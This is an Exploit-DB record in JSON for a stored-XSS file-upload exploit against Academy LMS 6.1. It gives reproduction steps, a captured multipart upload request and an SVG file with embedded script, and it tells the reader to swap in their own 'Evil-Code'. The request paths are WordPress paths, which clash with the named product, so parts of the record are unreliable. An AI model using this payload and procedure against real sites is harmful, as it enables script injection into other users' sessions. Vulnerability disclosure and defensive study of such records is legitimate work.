{"source": "https://www.exploit-db.com/exploits/51702", "vulnName": "Academy LMS 6.1 - Arbitrary File Upload", "vulnEDBID": "51702", "vulnCVE": "N/A", "author": "CRACKER", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2023-09-04", "vulnContent": "# Exploit Title: Academy LMS 6.1 - Arbitrary File Upload\n# Exploit Author: CraCkEr\n# Date: 05/08/2023\n# Vendor: Creativeitem\n# Vendor Homepage: https://academylms.net/\n# Software Link: https://demo.academylms.net/\n# Version: 6.1\n# Tested on: Windows 10 Pro\n# Impact: Allows User to upload files to the web server\n# CWE: CWE-79 - CWE-74 - CWE-707\n\n\n## Description\n\nAllows Attacker to upload malicious files onto the server, such as Stored XSS\n\n\n## Steps to Reproduce:\n\n1. Login as a [Normal User]\n2. In [User Dashboard], go to [Profile Settings] on this Path: https://website/dashboard/#/settings\n3. Upload any Image into the [avatar]\n4. Capture the POST Request with [Burp Proxy Intercept]\n5. Edit the file extension to .svg & inject your [Evil-Code] or [Stored XSS]\n\n-----------------------------------------------------------\nPOST /wp-admin/async-upload.php HTTP/2\n\n-----------------------------------------------------------\nContent-Disposition: form-data; name=\"async-upload\"; filename=\"ahacka.svg\"\nContent-Type: image/svg+xml\n\n<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n\n<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n<polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/>\n<script type=\"text/javascript\">\nalert(\"XSS by CraCkEr\");\n</script>\n</svg>\n-----------------------------------------------------------\n\n6. Send the Request\n7. Capture the GET request from [Burp Logger] to get the Path of your Uploaded [Stored-XSS]\n8. Access your Uploded Evil file on this Path: https://website/wp-content/uploads/***/**/*****.svg\n\n\n\n[-] Done\n            "}